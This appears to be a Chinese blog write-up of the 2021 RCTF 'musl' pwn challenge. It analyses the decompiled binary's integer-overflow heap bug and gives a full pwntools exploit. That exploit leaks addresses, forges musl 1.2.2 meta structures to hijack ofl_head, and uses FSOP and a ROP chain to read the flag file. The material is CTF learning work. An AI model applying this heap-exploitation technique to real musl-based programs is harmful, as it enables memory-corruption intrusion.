    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>利用<code>2021RCTF</code>的<code>musl</code>学习一下<code>musl-libc</code>的利用技巧。在阅读之前建议根据文末的参考资料了解一下<code>musl-libc</code>的基本知识。<br>题目musl采用的是<code>musl-libc 1.2.2</code></p><h2 id="0x1-功能分析"><a href="#0x1-功能分析" class="headerlink" title="0x1 功能分析"></a>0x1 功能分析</h2><ul><li><p>add（漏洞点）: 先申请一个size&#x3D;0xc的控制堆块chunk1，将chunk1放到全局指针数组ptr中，然后再根据用户输入的大小申请内容堆块chunk2，并将chunk2的地址存放在chunk1的前8字节，chunk2的大小减一存放在chunk1的剩余4字节。之后再根据chunk1的地址和大小进行输入内容。</p><figure class="highlight arduino"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> idx; <span class="hljs-comment">// [rsp+0h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;idx?&quot;</span>);<br>  idx = <span class="hljs-built_in">readint</span>();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( idx &gt; <span class="hljs-number">15</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  v3 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xC</span>uLL);<br>  <span class="hljs-keyword">if</span> ( !v3 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  ptr[idx] = v3;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;size?&quot;</span>);<br>  size = <span class="hljs-built_in">readint</span>();<br>  *(_QWORD *)v3 = <span class="hljs-built_in">malloc</span>(size);<br>  v3[<span class="hljs-number">2</span>] = size - <span class="hljs-number">1</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Contnet?&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">readn</span>(*(_QWORD *)v3, v3[<span class="hljs-number">2</span>]);           <span class="hljs-comment">// overflow 整数溢出 0-1=-1</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>show：根据idx在ptr中确定chunk1的地址，然后从chunk1中取出chunk2的地址和内容大小，然后利用地址输出内容</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> idx; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> **v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;idx?&quot;</span>);<br>  idx = <span class="hljs-built_in">readint</span>();<br>  <span class="hljs-keyword">if</span> ( idx &gt;= <span class="hljs-number">0</span> &amp;&amp; idx &lt;= <span class="hljs-number">15</span> &amp;&amp; (v2 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)ptr[idx]) != <span class="hljs-number">0LL</span> &amp;&amp; <span class="hljs-built_in">strlen</span>(*v2) &lt;= *((<span class="hljs-type">int</span> *)v2 + <span class="hljs-number">2</span>) )<span class="hljs-comment">// 0&lt;=idx&lt;=15,内容长度小于等于size，对应堆数组值不为0</span><br>    result = <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content: %s\n&quot;</span>, *v2);<br>  <span class="hljs-keyword">else</span><br>    result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>delete：根据idx在ptr中确定chunk1的地址，然后从chunk1中取出chunk2的地址,然后依次释放chunk2和chunk1，并都置为0。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">delete</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> idx; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">void</span> **ptr; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;idx?&quot;</span>);<br>  idx = <span class="hljs-built_in">readint</span>();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( idx &gt; <span class="hljs-number">15</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  ptr = (<span class="hljs-type">void</span> **)::ptr[idx];<br>  <span class="hljs-keyword">if</span> ( !*ptr )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  <span class="hljs-built_in">free</span>(*ptr);<br>  <span class="hljs-built_in">free</span>(ptr);<br>  ::ptr[idx] = <span class="hljs-number">0LL</span>;<br>  *ptr = <span class="hljs-number">0LL</span>;<br>  *((_DWORD *)ptr + <span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ok&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="0x3-利用思路"><a href="#0x3-利用思路" class="headerlink" title="0x3 利用思路"></a>0x3 利用思路</h2><ol><li>由于申请一个group的chunk时优先选取新的可用chunk，而不是刚free的chunk，所以我没需要先把该group中的所有chunk申请了;</li><li>为了泄露地址，我们需要连续申请多个自定义size&#x3D;0xc的chunk，这样就可以删除其中一个chunk,然后再申请它，此时进行溢出，填充非<code>\x00</code>字节直到下一个chunk的控制堆块，从而可以使用<code>show</code>泄露出下一个chunk的内容堆块的地址；</li><li>利用上述方法泄露出<code>heap_addr</code>和<code>__malloc_context</code>，前者可以用来确定libc基址，后者可以用于伪造meta，从而触发<code>dequeue函数</code>（类似glibc的<code>unlink</code>），将指针<code>ofl_head</code>(类似glibc的<code>__IO_list_all</code>)的值改为伪造的文件流</li><li>在伪造的文件流中设置<code>magic_gadget</code>,进行栈迁移到ROP链的地址处，进行ORW;</li><li>执行<code>exit</code>从而执行<code>__stdio_exit</code>函数和<code>close_file(FILE *f)</code>，从而执行<code>magic_gadget</code>和ORW，获取flag。</li></ol><h2 id="0x4-Exp"><a href="#0x4-Exp" class="headerlink" title="0x4 Exp"></a>0x4 Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@文件        :exp.py</span><br><span class="hljs-string">@说明        :dequeue（musl-libc 1.2.2） + 堆溢出 + 整数溢出 + FSOP</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span class="hljs-string">@防护</span><br><span class="hljs-string">    Arch:     amd64-64-little</span><br><span class="hljs-string">    RELRO:    Full RELRO</span><br><span class="hljs-string">    Stack:    Canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      PIE enabled</span><br><span class="hljs-string"></span><br><span class="hljs-string">seccomp-tools dump ./musl </span><br><span class="hljs-string"> line  CODE  JT   JF      K</span><br><span class="hljs-string">=================================</span><br><span class="hljs-string"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="hljs-string"> 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006</span><br><span class="hljs-string"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="hljs-string"> 0003: 0x35 0x02 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0006</span><br><span class="hljs-string"> 0004: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0006</span><br><span class="hljs-string"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="hljs-string"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pwnlib<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>p = process([<span class="hljs-string">&#x27;./libc.so&#x27;</span>,<span class="hljs-string">&#x27;./musl&#x27;</span>])<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;idx?&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br>    p.sendlineafter(<span class="hljs-string">&quot;size?&quot;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&quot;Contnet?&quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;idx?&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;idx?&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-comment"># 因为申请该group的chunk时优先选取新的可用chunk，而不是free的chunk</span><br><span class="hljs-comment"># 该group可以有30个，必须要先全部申请了</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    add(i,<span class="hljs-number">0xC</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0xB</span>) <span class="hljs-comment"># 一次就是2个</span><br><br>log.info(<span class="hljs-string">&quot;leak libc &amp; leak heap&quot;</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0xf</span>) <span class="hljs-comment"># 使用的就是free的chunk &#x27;\n&#x27;占1Byte，所以只需输入0xf</span><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&quot;BB\n&quot;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address =  heap_addr - <span class="hljs-number">0x298d50</span><br>__malloc_context = libc.sym[<span class="hljs-string">&quot;__malloc_context&quot;</span>]<br>log.success(<span class="hljs-string">&quot;heap_addr: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_addr))<br>log.success(<span class="hljs-string">&quot;__malloc_context: &quot;</span> + <span class="hljs-built_in">hex</span>(__malloc_context))<br>log.success(<span class="hljs-string">&quot;libcbase: &quot;</span> + <span class="hljs-built_in">hex</span>(libc.address))<br><br>log.info(<span class="hljs-string">&quot;leak check&quot;</span>)<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x10</span> + p64(__malloc_context)) <span class="hljs-comment"># 修改idx=3的 控制chunk 中的 内容chunk 指针为 __malloc_context,即可控制ctx</span><br>show(<span class="hljs-number">3</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>check = u64(p.recv(<span class="hljs-number">8</span>))<br>log.success(<span class="hljs-string">&quot;check: &quot;</span> + <span class="hljs-built_in">hex</span>(check))<br><br><span class="hljs-comment"># gadgets</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">magic_gadget:</span><br><span class="hljs-string">0x7ffff7db05ae &lt;longjmp+30&gt;:mov    rsp,QWORD PTR [rdi+0x30]</span><br><span class="hljs-string">0x7ffff7db05b2 &lt;longjmp+34&gt;:jmp    QWORD PTR [rdi+0x38]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>magic_gadget = libc.address + <span class="hljs-number">0x4a5ae</span><br>ret = libc.address + <span class="hljs-number">0x598</span><br>pop_rax_ret = libc.address + <span class="hljs-number">0x1b8fd</span><br>pop_rdi_ret = libc.address + <span class="hljs-number">0x14b82</span><br>pop_rdx_ret = libc.address + <span class="hljs-number">0x9328</span><br>pop_rsi_ret = libc.address + <span class="hljs-number">0x1b27a</span><br>syscall = libc.address + <span class="hljs-number">0x1d14</span><br>syscall_ret = libc.address + <span class="hljs-number">0x23711</span><br><br>sc = <span class="hljs-number">0</span><br>freeable = <span class="hljs-number">1</span><br>last_idx = <span class="hljs-number">0</span><br>maplen = <span class="hljs-number">0</span><br>ofl_head_addr = libc.address + <span class="hljs-number">0x297E68</span> <br>fake_mem_addr = heap_addr + <span class="hljs-number">0xF0</span> - <span class="hljs-number">0x50</span><br><br>log.info(<span class="hljs-string">&quot;write ORW &amp; fake meta &amp; fake meta_area to Mem&quot;</span>)<br>orw = <span class="hljs-string">b&#x27;D&#x27;</span>*<span class="hljs-number">0x300</span><br><span class="hljs-comment"># fd = open(flag_addr,0) = 3</span><br>orw += p64(pop_rdi_ret)<br>orw += p64(heap_addr + <span class="hljs-number">0x60</span>) <span class="hljs-comment"># &quot;./flag&quot;的地址 因为是后面才写入该字符串，所以后面才能确定</span><br>orw += p64(pop_rsi_ret)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>])<br><span class="hljs-comment"># read(fd,buf,0x1000)</span><br>orw += p64(pop_rdi_ret)<br>orw += p64(<span class="hljs-number">3</span>)<br>orw += p64(pop_rsi_ret)<br>orw += p64(heap_addr + <span class="hljs-number">0x100</span>) <span class="hljs-comment"># heap_addr + 0x1b0 &lt; the address &lt;heap_addr + 0x12b0 就不能输出??</span><br>orw += p64(pop_rdx_ret)<br>orw += p64(<span class="hljs-number">0x100</span>)<br>orw += p64(libc.sym[<span class="hljs-string">&quot;read&quot;</span>])<br><span class="hljs-comment"># write(1,buf,0x1000)</span><br>orw += p64(pop_rdi_ret)<br>orw += p64(<span class="hljs-number">1</span>)<br>orw += p64(pop_rsi_ret)<br>orw += p64(heap_addr + <span class="hljs-number">0x100</span>)<br>orw += p64(pop_rdx_ret)<br>orw += p64(<span class="hljs-number">0x100</span>)<br>orw += p64(libc.sym[<span class="hljs-string">&quot;write&quot;</span>])<br><br>payload1 = orw<br>payload1 = payload1.ljust(<span class="hljs-number">0x1000</span>-<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;E&#x27;</span>) <span class="hljs-comment">#加上开始的0x20字节元数据(meta_area)，刚好占了1页（0x1000）</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">下面是新的一页，所以需要meta_area,check必须一致，因为get_meta函数中会检查，check位于meta所在页的前8字节</span><br><span class="hljs-string">根据mata找meta_area: meta &amp; 0xfffffffffffff000 ,即找当前页的起始地址</span><br><span class="hljs-string">由于只检查了check，所以只需要构造check,然后\x00截断一下即可</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># fake meta_area</span><br>payload1 += p64(check) <span class="hljs-comment"># 存放地址是mmaped_page + 0x1000</span><br>payload1 += p64(<span class="hljs-number">0</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">m-&gt;prev-&gt;next = m-&gt;next; // 这里存在指针互写 在 prev 所指地址上 写入next 指针</span><br><span class="hljs-string">m-&gt;next-&gt;prev = m-&gt;prev; // 在next 所指地址上 写入prev 指针</span><br><span class="hljs-string"></span><br><span class="hljs-string">P = m-&gt;prev</span><br><span class="hljs-string">N = m-&gt;next</span><br><span class="hljs-string"></span><br><span class="hljs-string">*(P + 8) = N</span><br><span class="hljs-string">*(N + 0）= P</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># fake_meta</span><br>payload1 += p64(ofl_head_addr - <span class="hljs-number">0x8</span>) <span class="hljs-comment"># prev | target - 8</span><br>payload1 += p64(fake_mem_addr) <span class="hljs-comment"># next | target_value</span><br>payload1 += p64(fake_mem_addr) <span class="hljs-comment"># mem | 这个地址必须指向group，get_meta函数中会检查meta 是否指向对应的group</span><br>payload1 += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># avail_mask</span><br>payload1 += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># freed_mask</span><br>payload1 += p64((maplen&lt;&lt;<span class="hljs-number">12</span>)|(sc&lt;&lt;<span class="hljs-number">6</span>)|(freeable&lt;&lt;<span class="hljs-number">5</span>)|last_idx)<br>payload1 += p64(<span class="hljs-number">0</span>)<br><br>delete(<span class="hljs-number">9</span>) <span class="hljs-comment"># 空出2个0xc的chunk</span><br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x2000</span>,payload1) <span class="hljs-comment"># 9</span><br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x2000</span>,<span class="hljs-string">&#x27;D&#x27;</span>) <span class="hljs-comment"># 申请多余的那一个空闲chunk(size=0xc),减少影响</span><br><br>log.info(<span class="hljs-string">&quot;leak address of ORW &amp; fake meta &amp; fake meta_area&quot;</span>)<br>delete(<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;E&#x27;</span>*<span class="hljs-number">0xf</span>)<br>show(<span class="hljs-number">8</span>)<br>p.recvuntil(<span class="hljs-string">&quot;E\n&quot;</span>)<br>mmaped_page = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x20</span> <span class="hljs-comment"># 0x7ffff7fee000 前20字节是元数据，payload是从0x7ffff7fee020开始的</span><br>log.success(<span class="hljs-string">&quot;mmaped_page: &quot;</span> + <span class="hljs-built_in">hex</span>(mmaped_page)) <span class="hljs-comment"># payload1存放的内存地址，包含了ORW和fake_meta</span><br>orw_addr = mmaped_page + <span class="hljs-number">0x300</span> + <span class="hljs-number">0x20</span><br>fake_meta_addr = mmaped_page + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0x10</span><br><br>log.info(<span class="hljs-string">&quot;build idx &amp; offset to point at fake meta&quot;</span>)<br><span class="hljs-comment"># const struct group *base = (const void *)(p - UNIT*offset - UNIT)  UNIT=0x10</span><br><span class="hljs-comment"># group_base = p - 0x10</span><br>payload2 = p64(fake_meta_addr) <span class="hljs-comment"># 此处是fake_group，值为fake_mata的地址</span><br>payload2 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># offset = 0 idx = 0 (伪造idx和offset，从而伪造group)</span><br>payload2 += p64(fake_mem_addr + <span class="hljs-number">0x20</span>) <span class="hljs-comment"># 值为fake_mem，此处是chunk地址，确保能正确删除idx=7的内容chunk</span><br><br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>,payload2) <span class="hljs-comment"># 根据mem地址确定meta地址</span><br>delete(<span class="hljs-number">7</span>) <span class="hljs-comment"># 删除idx=7的控制chunk时触发deqeune</span><br><br>fake_file = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span><br>fake_file += p64(orw_addr) <span class="hljs-comment"># mustbezero_1 | [rdi+0x30]</span><br>fake_file += p64(ret) <span class="hljs-comment"># wbase | [rdi+0x38]</span><br>fake_file += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># (*read)(FILE *, unsigned char *, size_t)</span><br>fake_file += p64(magic_gadget) <span class="hljs-comment"># (*write)(FILE *, const unsigned char *, size_t)</span><br>fake_file = fake_file.ljust(<span class="hljs-number">0x8C</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_file += p32(<span class="hljs-number">0xFFFFFFFF</span>)<br><br><span class="hljs-comment"># 这个0x40取决于idx=4的内容chunk与fake_mem_addr的偏移，使fake_mem_addr处刚好是fake_file</span><br>payload3 = <span class="hljs-string">b&quot;./flag\x00&quot;</span>.ljust(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload3 += fake_file<br>payload3 = payload3.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;G&#x27;</span>)<br><br>delete(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,payload3)<br><br><span class="hljs-comment"># pwnlib.gdb.attach(p)</span><br><span class="hljs-comment"># pwnlib.gdb.attach(p,&quot;b write&quot;)</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&#x27;4&#x27;</span>) <span class="hljs-comment"># exit</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="0x5-Reference"><a href="#0x5-Reference" class="headerlink" title="0x5 Reference"></a>0x5 Reference</h2><ul><li><a href="http://www.wangqingzheng.com/anquanke/1/241101.html">http://www.wangqingzheng.com/anquanke/1/241101.html</a></li><li><a href="https://www.cjovi.icu/WP/1549.html">https://www.cjovi.icu/WP/1549.html</a></li><li><a href="https://juejin.cn/post/6844903574154002445#heading-9">https://juejin.cn/post/6844903574154002445#heading-9</a></li><li><a href="https://niebelungen-d.top/2021/08/22/Musl-libc-Pwn-Learning/#exp">https://niebelungen-d.top/2021/08/22/Musl-libc-Pwn-Learning/#exp</a></li><li><a href="https://ctf.njupt.edu.cn/700.html#musl">https://ctf.njupt.edu.cn/700.html#musl</a></li><li><a 